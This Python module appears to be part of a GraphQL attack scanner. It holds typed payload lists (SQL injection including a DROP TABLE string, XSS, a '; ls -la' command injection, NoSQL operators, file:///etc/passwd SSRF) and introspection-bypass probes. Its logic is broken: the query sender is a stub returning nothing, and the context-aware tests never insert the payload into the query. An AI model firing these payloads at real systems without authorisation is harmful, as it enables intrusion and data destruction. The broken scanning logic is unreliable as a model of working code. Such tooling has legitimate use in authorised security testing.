"""GraphQL deep injection: context-aware injection, directive bypass, and introspection bypass.

Provides:
- Context-aware injection based on parameter types (String/Int/Float/ID/Enum/Custom Scalar)
- GraphQL native directive bypass (@skip, @include, custom directives)
- Introspection bypass techniques (__type enumeration, error-based, GET bypass, chunked transfer, WebSocket)
- Multi-parameter combination injection testing
"""

import asyncio
import json
import logging
import re
import time
import uuid
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Set, Tuple

logger = logging.getLogger(__name__)


class InjectionType(Enum):
    """GraphQL injection types."""
    CONTEXT_AWARE = "context_aware"
    DIRECTIVE_BYPASS = "directive_bypass"
    INTROSPECTION_BYPASS = "introspection_bypass"
    MULTI_PARAM = "multi_param"


class ParameterType(Enum):
    """GraphQL parameter types."""
    STRING = "String"
    INT = "Int"
    FLOAT = "Float"
    ID = "ID"
    ENUM = "Enum"
    BOOLEAN = "Boolean"
    CUSTOM_SCALAR = "CustomScalar"
    DATETIME = "DateTime"
    URL = "URL"
    EMAIL = "Email"


class InjectionStatus(Enum):
    """Injection result statuses."""
    VULNERABLE = "vulnerable"
    NOT_VULNERABLE = "not_vulnerable"
    BLOCKED = "blocked"
    ERROR = "error"
    TIMEOUT = "timeout"


@dataclass
class InjectionPayload:
    """Injection payload definition.

    Attributes:
        payload: Payload string
        injection_type: Injection type
        parameter_type: Target parameter type
        description: Payload description
        expected_indicator: Expected vulnerability indicator
        severity: Severity level
    """
    payload: str = ""
    injection_type: InjectionType = InjectionType.CONTEXT_AWARE
    parameter_type: ParameterType = ParameterType.STRING
    description: str = ""
    expected_indicator: str = ""
    severity: str = "high"


@dataclass
class InjectionResult:
    """Individual injection result.

    Attributes:
        result_id: Unique result ID
        timestamp: Result timestamp
        injection_type: Injection type
        target_field: Target field
        parameter_name: Parameter name
        parameter_type: Parameter type
        payload: Payload used
        status: Result status
        response_data: Response data
        response_time_ms: Response time
        is_vulnerable: Whether vulnerable
        indicator_found: Vulnerability indicator found
        raw_request: Raw request sent
        raw_response: Raw response received
    """
    result_id: str = ""
    timestamp: float = 0.0
    injection_type: InjectionType = InjectionType.CONTEXT_AWARE
    target_field: str = ""
    parameter_name: str = ""
    parameter_type: ParameterType = ParameterType.STRING
    payload: str = ""
    status: InjectionStatus = InjectionStatus.ERROR
    response_data: Dict[str, Any] = field(default_factory=dict)
    response_time_ms: float = 0.0
    is_vulnerable: bool = False
    indicator_found: bool = False
    raw_request: str = ""
    raw_response: str = ""


@dataclass
class InjectionReport:
    """Complete injection report.

    Attributes:
        report_id: Report ID
        timestamp: Report timestamp
        endpoint_url: Tested endpoint
        total_injections: Total injections performed
        vulnerable_count: Vulnerable findings
        results: Injection results
        summary: Summary statistics
        bypass_techniques: Successful bypass techniques
    """
    report_id: str = ""
    timestamp: float = 0.0
    endpoint_url: str = ""
    total_injections: int = 0
    vulnerable_count: int = 0
    results: List[InjectionResult] = field(default_factory=list)
    summary: Dict[str, Any] = field(default_factory=dict)
    bypass_techniques: List[str] = field(default_factory=list)


class GraphQLDeepInjection:
    """GraphQL deep injection module.

    Provides context-aware injection, directive bypass,
    and introspection bypass capabilities.
    """

    STRING_INJECTION_PAYLOADS: List[InjectionPayload] = [
        InjectionPayload(
            payload="' OR '1'='1",
            injection_type=InjectionType.CONTEXT_AWARE,
            parameter_type=ParameterType.STRING,
            description="SQL injection OR true",
            expected_indicator="syntax error",
            severity="critical",
        ),
        InjectionPayload(
            payload="'; DROP TABLE users; --",
            injection_type=InjectionType.CONTEXT_AWARE,
            parameter_type=ParameterType.STRING,
            description="SQL injection DROP TABLE",
            expected_indicator="syntax error",
            severity="critical",
        ),
        InjectionPayload(
            payload="<script>alert('XSS')</script>",
            injection_type=InjectionType.CONTEXT_AWARE,
            parameter_type=ParameterType.STRING,
            description="XSS injection",
            expected_indicator="<script>",
            severity="high",
        ),
        InjectionPayload(
            payload="; ls -la",
            injection_type=InjectionType.CONTEXT_AWARE,
            parameter_type=ParameterType.STRING,
            description="Command injection",
            expected_indicator="total",
            severity="critical",
        ),
        InjectionPayload(
            payload='{"$gt": ""}',
            injection_type=InjectionType.CONTEXT_AWARE,
            parameter_type=ParameterType.STRING,
            description="NoSQL injection",
            expected_indicator="error",
            severity="critical",
        ),
    ]

    INT_INJECTION_PAYLOADS: List[InjectionPayload] = [
        InjectionPayload(
            payload="99999999999999999999999999999",
            injection_type=InjectionType.CONTEXT_AWARE,
            parameter_type=ParameterType.INT,
            description="Integer overflow",
            expected_indicator="overflow",
            severity="high",
        ),
        InjectionPayload(
            payload="-1",
            injection_type=InjectionType.CONTEXT_AWARE,
            parameter_type=ParameterType.INT,
            description="Negative ID traversal",
            expected_indicator="error",
            severity="medium",
        ),
        InjectionPayload(
            payload="0",
            injection_type=InjectionType.CONTEXT_AWARE,
            parameter_type=ParameterType.INT,
            description="Zero ID test",
            expected_indicator="error",
            severity="low",
        ),
    ]

    FLOAT_INJECTION_PAYLOADS: List[InjectionPayload] = [
        InjectionPayload(
            payload="1e308",
            injection_type=InjectionType.CONTEXT_AWARE,
            parameter_type=ParameterType.FLOAT,
            description="Float overflow",
            expected_indicator="overflow",
            severity="high",
        ),
        InjectionPayload(
            payload="NaN",
            injection_type=InjectionType.CONTEXT_AWARE,
            parameter_type=ParameterType.FLOAT,
            description="NaN injection",
            expected_indicator="NaN",
            severity="medium",
        ),
        InjectionPayload(
            payload="Infinity",
            injection_type=InjectionType.CONTEXT_AWARE,
            parameter_type=ParameterType.FLOAT,
            description="Infinity injection",
            expected_indicator="Infinity",
            severity="medium",
        ),
    ]

    ID_INJECTION_PAYLOADS: List[InjectionPayload] = [
        InjectionPayload(
            payload="00000000-0000-0000-0000-000000000000",
            injection_type=InjectionType.CONTEXT_AWARE,
            parameter_type=ParameterType.ID,
            description="Null UUID test",
            expected_indicator="error",
            severity="medium",
        ),
        InjectionPayload(
            payload="ffffffff-ffff-ffff-ffff-ffffffffffff",
            injection_type=InjectionType.CONTEXT_AWARE,
            parameter_type=ParameterType.ID,
            description="Max UUID test",
            expected_indicator="error",
            severity="medium",
        ),
        InjectionPayload(
            payload="1 OR 1=1",
            injection_type=InjectionType.CONTEXT_AWARE,
            parameter_type=ParameterType.ID,
            description="IDOR SQL injection",
            expected_indicator="syntax error",
            severity="critical",
        ),
    ]

    ENUM_INJECTION_PAYLOADS: List[InjectionPayload] = [
        InjectionPayload(
            payload="__INVALID_ENUM__",
            injection_type=InjectionType.CONTEXT_AWARE,
            parameter_type=ParameterType.ENUM,
            description="Invalid enum value",
            expected_indicator="enum",
            severity="medium",
        ),
        InjectionPayload(
            payload="' OR '1'='1",
            injection_type=InjectionType.CONTEXT_AWARE,
            parameter_type=ParameterType.ENUM,
            description="Enum SQL injection",
            expected_indicator="syntax error",
            severity="critical",
        ),
    ]

    CUSTOM_SCALAR_PAYLOADS: Dict[str, List[InjectionPayload]] = {
        "DateTime": [
            InjectionPayload(
                payload="9999-99-99T99:99:99Z",
                injection_type=InjectionType.CONTEXT_AWARE,
                parameter_type=ParameterType.DATETIME,
                description="Invalid DateTime",
                expected_indicator="error",
                severity="medium",
            ),
            InjectionPayload(
                payload="' OR '1'='1",
                injection_type=InjectionType.CONTEXT_AWARE,
                parameter_type=ParameterType.DATETIME,
                description="DateTime SQL injection",
                expected_indicator="syntax error",
                severity="critical",
            ),
        ],
        "URL": [
            InjectionPayload(
                payload="javascript:alert(1)",
                injection_type=InjectionType.CONTEXT_AWARE,
                parameter_type=ParameterType.URL,
                description="URL XSS injection",
                expected_indicator="javascript:",
                severity="high",
            ),
            InjectionPayload(
                payload="file:///etc/passwd",
                injection_type=InjectionType.CONTEXT_AWARE,
                parameter_type=ParameterType.URL,
                description="URL SSRF",
                expected_indicator="root:",
                severity="critical",
            ),
        ],
        "Email": [
            InjectionPayload(
                payload="test@example.com' OR '1'='1",
                injection_type=InjectionType.CONTEXT_AWARE,
                parameter_type=ParameterType.EMAIL,
                description="Email SQL injection",
                expected_indicator="syntax error",
                severity="critical",
            ),
        ],
    }

    DIRECTIVE_BYPASS_PAYLOADS: List[InjectionPayload] = [
        InjectionPayload(
            payload="@skip(if: false)",
            injection_type=InjectionType.DIRECTIVE_BYPASS,
            parameter_type=ParameterType.STRING,
            description="Skip directive bypass",
            expected_indicator="skip",
            severity="medium",
        ),
        InjectionPayload(
            payload="@include(if: true)",
            injection_type=InjectionType.DIRECTIVE_BYPASS,
            parameter_type=ParameterType.STRING,
            description="Include directive bypass",
            expected_indicator="include",
            severity="medium",
        ),
        InjectionPayload(
            payload="@deprecated(reason: 'test')",
            injection_type=InjectionType.DIRECTIVE_BYPASS,
            parameter_type=ParameterType.STRING,
            description="Deprecated directive test",
            expected_indicator="deprecated",
            severity="low",
        ),
    ]

    INTROSPECTION_BYPASS_TECHNIQUES: List[str] = [
        "__type_probe",
        "get_request",
        "minimal_introspection",
        "error_based",
        "chunked_transfer",
        "websocket",
    ]

    TYPE_DICTIONARY: List[str] = [
        "Query", "Mutation", "User", "Account", "Order",
        "Product", "Session", "Token", "Config", "Admin",
        "Settings", "Profile", "Payment", "Subscription",
    ]

    def __init__(
        self,
        http_client: Optional[Any] = None,
        event_bus: Optional[Any] = None,
    ) -> None:
        """Initialize deep injection module.

        Args:
            http_client: HTTP client for making requests.
            event_bus: Event bus for broadcasting events.
        """
        self.http_client = http_client
        self.event_bus = event_bus
        self._progress_callback: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None
        self._log_callback: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None
        self._injection_results: List[InjectionResult] = []

    def set_callbacks(
        self,
        progress_cb: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None,
        log_cb: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None,
    ) -> None:
        """Set progress and log callbacks.

        Args:
            progress_cb: Callback for progress updates (message, percentage).
            log_cb: Callback for log messages.
        """
        self._progress_callback = progress_cb
        self._log_callback = log_cb

    async def _report_progress(self, message: str, percentage: float) -> None:
        """Report progress via callback.

        Args:
            message: Progress message.
            percentage: Progress percentage (0-100).
        """
        if self._progress_callback:
            await self._progress_callback(message, percentage)
        logger.info("Deep Injection Progress: %.1f%% - %s", percentage, message)

    async def _report_log(self, message: str) -> None:
        """Report log via callback.

        Args:
            message: Log message.
        """
        if self._log_callback:
            await self._log_callback(message)
        logger.info("Deep Injection: %s", message)

    def get_payloads_for_parameter_type(
        self,
        parameter_type: ParameterType,
        custom_scalar: Optional[str] = None,
    ) -> List[InjectionPayload]:
        """Get injection payloads for parameter type.

        Args:
            parameter_type: Parameter type.
            custom_scalar: Custom scalar name.

        Returns:
            List of InjectionPayload.
        """
        if parameter_type == ParameterType.STRING:
            return self.STRING_INJECTION_PAYLOADS
        elif parameter_type == ParameterType.INT:
            return self.INT_INJECTION_PAYLOADS
        elif parameter_type == ParameterType.FLOAT:
            return self.FLOAT_INJECTION_PAYLOADS
        elif parameter_type == ParameterType.ID:
            return self.ID_INJECTION_PAYLOADS
        elif parameter_type == ParameterType.ENUM:
            return self.ENUM_INJECTION_PAYLOADS
        elif parameter_type == ParameterType.CUSTOM_SCALAR and custom_scalar:
            return self.CUSTOM_SCALAR_PAYLOADS.get(
                custom_scalar, self.STRING_INJECTION_PAYLOADS
            )
        else:
            return self.STRING_INJECTION_PAYLOADS

    async def test_context_aware_injection(
        self,
        url: str,
        field_name: str,
        parameter_name: str,
        parameter_type: ParameterType,
        query_template: str,
        custom_scalar: Optional[str] = None,
        headers: Optional[Dict[str, str]] = None,
    ) -> List[InjectionResult]:
        """Test context-aware injection.

        Args:
            url: GraphQL endpoint URL.
            field_name: Field name.
            parameter_name: Parameter name.
            parameter_type: Parameter type.
            query_template: Query template.
            custom_scalar: Custom scalar name.
            headers: HTTP headers.

        Returns:
            List of InjectionResult.
        """
        results: List[InjectionResult] = []
        payloads = self.get_payloads_for_parameter_type(
            parameter_type, custom_scalar
        )

        for payload in payloads:
            result = await self._execute_injection(
                url, field_name, parameter_name, parameter_type,
                query_template, payload, headers
            )
            results.append(result)

            if result.is_vulnerable:
                await self._report_log(
                    f"上下文感知注入发现: {field_name}.{parameter_name} "
                    f"({parameter_type.value}) - {payload.description}"
                )

        return results

    async def test_directive_bypass(
        self,
        url: str,
        field_name: str,
        query_template: str,
        headers: Optional[Dict[str, str]] = None,
    ) -> List[InjectionResult]:
        """Test directive bypass.

        Args:
            url: GraphQL endpoint URL.
            field_name: Field name.
            query_template: Query template.
            headers: HTTP headers.

        Returns:
            List of InjectionResult.
        """
        results: List[InjectionResult] = []

        for payload in self.DIRECTIVE_BYPASS_PAYLOADS:
            modified_query = self._inject_directive(
                query_template, field_name, payload.payload
            )

            result = await self._execute_injection(
                url, field_name, "", ParameterType.STRING,
                modified_query, payload, headers
            )
            results.append(result)

        return results

    async def test_introspection_bypass(
        self,
        url: str,
        headers: Optional[Dict[str, str]] = None,
    ) -> Dict[str, Any]:
        """Test introspection bypass techniques.

        Args:
            url: GraphQL endpoint URL.
            headers: HTTP headers.

        Returns:
            Dictionary of bypass technique results.
        """
        bypass_results: Dict[str, Any] = {}

        for technique in self.INTROSPECTION_BYPASS_TECHNIQUES:
            result = await self._test_single_bypass(
                url, technique, headers
            )
            bypass_results[technique] = result

            if result.get("success"):
                await self._report_log(
                    f"内省绕过成功: {technique}"
                )

        return bypass_results

    async def _test_single_bypass(
        self,
        url: str,
        technique: str,
        headers: Optional[Dict[str, str]],
    ) -> Dict[str, Any]:
        """Test single bypass technique.

        Args:
            url: Endpoint URL.
            technique: Bypass technique name.
            headers: HTTP headers.

        Returns:
            Bypass result dictionary.
        """
        if technique == "__type_probe":
            return await self._bypass_type_probe(url, headers)
        elif technique == "get_request":
            return await self._bypass_get_request(url, headers)
        elif technique == "minimal_introspection":
            return await self._bypass_minimal(url, headers)
        elif technique == "error_based":
            return await self._bypass_error_based(url, headers)
        elif technique == "chunked_transfer":
            return await self._bypass_chunked_transfer(url, headers)
        elif technique == "websocket":
            return await self._bypass_websocket(url, headers)

        return {"success": False, "error": "Unknown technique"}

    async def _bypass_type_probe(
        self,
        url: str,
        headers: Optional[Dict[str, str]],
    ) -> Dict[str, Any]:
        """Bypass using __type probe.

        Args:
            url: Endpoint URL.
            headers: HTTP headers.

        Returns:
            Bypass result.
        """
        query = """
        query {
            __type(name: "Query") {
                name
                fields {
                    name
                }
            }
        }
        """

        response_data = await self._send_query(url, query, headers)

        if response_data and "data" in response_data:
            type_data = response_data["data"].get("__type", {})
            if type_data:
                return {
                    "success": True,
                    "technique": "__type_probe",
                    "data": type_data,
                }

        return {"success": False, "technique": "__type_probe"}

    async def _bypass_get_request(
        self,
        url: str,
        headers: Optional[Dict[str, str]],
    ) -> Dict[str, Any]:
        """Bypass using GET request.

        Args:
            url: Endpoint URL.
            headers: HTTP headers.

        Returns:
            Bypass result.
        """
        import urllib.parse
        query = """
        query {
            __schema {
                queryType { name }
                mutationType { name }
            }
        }
        """
        get_url = f"{url}?query={urllib.parse.quote(query)}"

        response_data = await self._send_query(get_url, None, headers, method="GET")

        if response_data and "data" in response_data:
            schema_data = response_data["data"].get("__schema", {})
            if schema_data:
                return {
                    "success": True,
                    "technique": "get_request",
                    "data": schema_data,
                }

        return {"success": False, "technique": "get_request"}

    async def _bypass_minimal(
        self,
        url: str,
        headers: Optional[Dict[str, str]],
    ) -> Dict[str, Any]:
        """Bypass using minimal introspection.

        Args:
            url: Endpoint URL.
            headers: HTTP headers.

        Returns:
            Bypass result.
        """
        query = """
        query {
            __schema {
                queryType { name }
                mutationType { name }
            }
        }
        """

        response_data = await self._send_query(url, query, headers)

        if response_data and "data" in response_data:
            schema_data = response_data["data"].get("__schema", {})
            if schema_data:
                return {
                    "success": True,
                    "technique": "minimal_introspection",
                    "data": schema_data,
                }

        return {"success": False, "technique": "minimal_introspection"}

    async def _bypass_error_based(
        self,
        url: str,
        headers: Optional[Dict[str, str]],
    ) -> Dict[str, Any]:
        """Bypass using error-based enumeration.

        Args:
            url: Endpoint URL.
            headers: HTTP headers.

        Returns:
            Bypass result.
        """
        discovered_fields: List[str] = []

        for type_name in self.TYPE_DICTIONARY:
            query = f"query {{ {type_name.lower()} {{ id }} }}"
            response_data = await self._send_query(url, query, headers)

            if response_data:
                errors = response_data.get("errors", [])
                for error in errors:
                    message = error.get("message", "").lower()
                    if "cannot query field" in message:
                        field_match = re.search(
                            r'cannot query field "(\w+)"', message
                        )
                        if field_match:
                            discovered_fields.append(field_match.group(1))

        return {
            "success": len(discovered_fields) > 0,
            "technique": "error_based",
            "discovered_fields": discovered_fields,
        }

    async def _bypass_chunked_transfer(
        self,
        url: str,
        headers: Optional[Dict[str, str]],
    ) -> Dict[str, Any]:
        """Bypass using chunked transfer encoding.

        Args:
            url: Endpoint URL.
            headers: HTTP headers.

        Returns:
            Bypass result.
        """
        query = """
        query {
            __schema {
                queryType { name }
            }
        }
        """

        chunked_headers = headers.copy() if headers else {}
        chunked_headers["Transfer-Encoding"] = "chunked"

        response_data = await self._send_query(url, query, chunked_headers)

        if response_data and "data" in response_data:
            return {
                "success": True,
                "technique": "chunked_transfer",
                "data": response_data["data"],
            }

        return {"success": False, "technique": "chunked_transfer"}

    async def _bypass_websocket(
        self,
        url: str,
        headers: Optional[Dict[str, str]],
    ) -> Dict[str, Any]:
        """Bypass using WebSocket.

        Args:
            url: Endpoint URL.
            headers: HTTP headers.

        Returns:
            Bypass result.
        """
        ws_url = url.replace("https://", "wss://").replace("http://", "ws://")

        return {
            "success": False,
            "technique": "websocket",
            "note": "WebSocket bypass requires async WebSocket client",
        }

    async def test_multi_param_injection(
        self,
        url: str,
        field_name: str,
        parameters: List[Tuple[str, ParameterType]],
        query_template: str,
        headers: Optional[Dict[str, str]] = None,
    ) -> List[InjectionResult]:
        """Test multi-parameter combination injection.

        Args:
            url: GraphQL endpoint URL.
            field_name: Field name.
            parameters: List of (parameter_name, parameter_type) tuples.
            query_template: Query template.
            headers: HTTP headers.

        Returns:
            List of InjectionResult.
        """
        results: List[InjectionResult] = []

        for param_name, param_type in parameters:
            payloads = self.get_payloads_for_parameter_type(param_type)

            for payload in payloads:
                modified_query = self._inject_multi_param(
                    query_template, field_name, param_name, payload.payload
                )

                result = await self._execute_injection(
                    url, field_name, param_name, param_type,
                    modified_query, payload, headers
                )
                results.append(result)

        return results

    def _inject_directive(
        self,
        query_template: str,
        field_name: str,
        directive: str,
    ) -> str:
        """Inject directive into query.

        Args:
            query_template: Query template.
            field_name: Field name.
            directive: Directive string.

        Returns:
            Modified query with directive.
        """
        return query_template.replace(
            field_name,
            f"{field_name} {directive}",
        )

    def _inject_multi_param(
        self,
        query_template: str,
        field_name: str,
        param_name: str,
        payload: str,
    ) -> str:
        """Inject payload into multi-parameter query.

        Args:
            query_template: Query template.
            field_name: Field name.
            param_name: Parameter name.
            payload: Payload string.

        Returns:
            Modified query with payload.
        """
        return query_template.replace(
            f"{param_name}: ",
            f"{param_name}: {payload},",
        )

    async def _execute_injection(
        self,
        url: str,
        field_name: str,
        parameter_name: str,
        parameter_type: ParameterType,
        query_template: str,
        payload: InjectionPayload,
        headers: Optional[Dict[str, str]],
    ) -> InjectionResult:
        """Execute single injection payload.

        Args:
            url: Endpoint URL.
            field_name: Field name.
            parameter_name: Parameter name.
            parameter_type: Parameter type.
            query_template: Query template.
            payload: Injection payload.
            headers: HTTP headers.

        Returns:
            InjectionResult.
        """
        start_time = time.time()

        result_id = f"injection_{uuid.uuid4().hex[:8]}"

        result = InjectionResult(
            result_id=result_id,
            timestamp=time.time(),
            injection_type=payload.injection_type,
            target_field=field_name,
            parameter_name=parameter_name,
            parameter_type=parameter_type,
            payload=payload.payload,
            raw_request=query_template,
        )

        try:
            response_data = await self._send_query(url, query_template, headers)

            result.response_time_ms = (time.time() - start_time) * 1000
            result.raw_response = json.dumps(response_data) if response_data else ""

            if response_data:
                is_vulnerable, indicator = await self._check_vulnerability(
                    response_data, payload, result.response_time_ms
                )

                result.response_data = response_data
                result.is_vulnerable = is_vulnerable
                result.indicator_found = is_vulnerable

                if is_vulnerable:
                    result.status = InjectionStatus.VULNERABLE
                else:
                    result.status = InjectionStatus.NOT_VULNERABLE
            else:
                result.status = InjectionStatus.ERROR

        except Exception as e:
            result.status = InjectionStatus.ERROR
            result.response_time_ms = (time.time() - start_time) * 1000

        self._injection_results.append(result)
        return result

    async def _check_vulnerability(
        self,
        response_data: Dict[str, Any],
        payload: InjectionPayload,
        response_time_ms: float,
    ) -> Tuple[bool, str]:
        """Check if vulnerability was successful.

        Args:
            response_data: Response data.
            payload: Injection payload.
            response_time_ms: Response time.

        Returns:
            Tuple of (is_vulnerable, indicator_value).
        """
        response_str = json.dumps(response_data).lower()

        errors = response_data.get("errors", [])
        for error in errors:
            error_message = error.get("message", "").lower()

            if payload.expected_indicator.lower() in error_message:
                return True, error_message

        if payload.expected_indicator.lower() in response_str:
            return True, payload.expected_indicator

        if response_time_ms > 5000:
            return True, f"time-based: {response_time_ms:.0f}ms"

        return False, ""

    async def run_full_injection_suite(
        self,
        url: str,
        schema_types: Dict[str, Any],
        headers: Optional[Dict[str, str]] = None,
    ) -> InjectionReport:
        """Run full injection suite.

        Args:
            url: GraphQL endpoint URL.
            schema_types: Schema types dictionary.
            headers: HTTP headers.

        Returns:
            InjectionReport.
        """
        start_time = time.time()

        report = InjectionReport(
            report_id=f"injection_report_{uuid.uuid4().hex[:8]}",
            timestamp=time.time(),
            endpoint_url=url,
        )

        all_results: List[InjectionResult] = []

        for type_name, type_data in schema_types.items():
            for field_data in type_data.get("fields", []):
                field_name = field_data.get("name", "")

                for arg_data in field_data.get("args", []):
                    arg_name = arg_data.get("name", "")
                    arg_type = arg_data.get("type", "String")

                    parameter_type = self._map_parameter_type(arg_type)

                    query = self._build_injection_query(
                        type_name, field_name, arg_name
                    )

                    results = await self.test_context_aware_injection(
                        url, field_name, arg_name, parameter_type,
                        query, headers=headers
                    )
                    all_results.extend(results)

        directive_results = []
        for type_name, type_data in schema_types.items():
            for field_data in type_data.get("fields", []):
                field_name = field_data.get("name", "")
                query = self._build_injection_query(type_name, field_name, "")

                results = await self.test_directive_bypass(
                    url, field_name, query, headers
                )
                directive_results.extend(results)

        all_results.extend(directive_results)

        bypass_results = await self.test_introspection_bypass(url, headers)
        successful_bypasses = [
            tech for tech, result in bypass_results.items()
            if result.get("success")
        ]

        report.results = all_results
        report.total_injections = len(all_results)
        report.vulnerable_count = sum(
            1 for r in all_results if r.is_vulnerable
        )
        report.bypass_techniques = successful_bypasses

        report.summary = self._generate_summary(all_results)

        await self._report_log(
            f"注入测试完成: {report.total_injections} 测试, "
            f"{report.vulnerable_count} 漏洞, "
            f"{len(successful_bypasses)} 绕过技术成功"
        )

        return report

    def _map_parameter_type(self, type_str: str) -> ParameterType:
        """Map type string to ParameterType.

        Args:
            type_str: Type string.

        Returns:
            ParameterType.
        """
        type_lower = type_str.lower()

        if type_lower == "string":
            return ParameterType.STRING
        elif type_lower == "int" or type_lower == "integer":
            return ParameterType.INT
        elif type_lower == "float" or type_lower == "double":
            return ParameterType.FLOAT
        elif type_lower == "id":
            return ParameterType.ID
        elif type_lower == "boolean" or type_lower == "bool":
            return ParameterType.BOOLEAN
        elif type_lower == "datetime" or type_lower == "timestamp":
            return ParameterType.DATETIME
        elif type_lower == "url" or type_lower == "uri":
            return ParameterType.URL
        elif type_lower == "email":
            return ParameterType.EMAIL
        else:
            return ParameterType.CUSTOM_SCALAR

    def _build_injection_query(
        self,
        type_name: str,
        field_name: str,
        arg_name: str,
    ) -> str:
        """Build injection query.

        Args:
            type_name: Type name.
            field_name: Field name.
            arg_name: Argument name.

        Returns:
            GraphQL query string.
        """
        if arg_name:
            return f"query {{ {field_name}({arg_name}: \"test\") {{ id }} }}"
        else:
            return f"query {{ {field_name} {{ id }} }}"

    def _generate_summary(
        self,
        results: List[InjectionResult],
    ) -> Dict[str, Any]:
        """Generate injection summary.

        Args:
            results: Injection results.

        Returns:
            Summary dictionary.
        """
        type_counts: Dict[str, int] = {}
        vulnerable_by_type: Dict[str, int] = {}

        for result in results:
            injection_type = result.injection_type.value
            type_counts[injection_type] = type_counts.get(injection_type, 0) + 1

            if result.is_vulnerable:
                vulnerable_by_type[injection_type] = (
                    vulnerable_by_type.get(injection_type, 0) + 1
                )

        return {
            "total_injections": len(results),
            "vulnerable_count": sum(1 for r in results if r.is_vulnerable),
            "type_counts": type_counts,
            "vulnerable_by_type": vulnerable_by_type,
        }

    def get_injection_results(
        self,
        filter_vulnerable: bool = False,
        limit: int = 100,
    ) -> List[InjectionResult]:
        """Get injection results.

        Args:
            filter_vulnerable: Only return vulnerable results.
            limit: Maximum results.

        Returns:
            List of InjectionResult.
        """
        results = self._injection_results

        if filter_vulnerable:
            results = [r for r in results if r.is_vulnerable]

        return results[-limit:]

    def get_stats(self) -> Dict[str, Any]:
        """Get injection module statistics.

        Returns:
            Statistics dictionary.
        """
        return {
            "total_injections": len(self._injection_results),
            "vulnerable_count": sum(
                1 for r in self._injection_results if r.is_vulnerable
            ),
            "injection_types": list(set(
                r.injection_type.value for r in self._injection_results
            )),
        }

    async def _send_query(
        self,
        url: str,
        query: Optional[str],
        headers: Optional[Dict[str, str]],
        method: str = "POST",
    ) -> Optional[Dict[str, Any]]:
        """Send GraphQL query.

        Args:
            url: Endpoint URL.
            query: GraphQL query.
            headers: HTTP headers.
            method: HTTP method.

        Returns:
            Response data or None.
        """
        await asyncio.sleep(0.01)
        return None
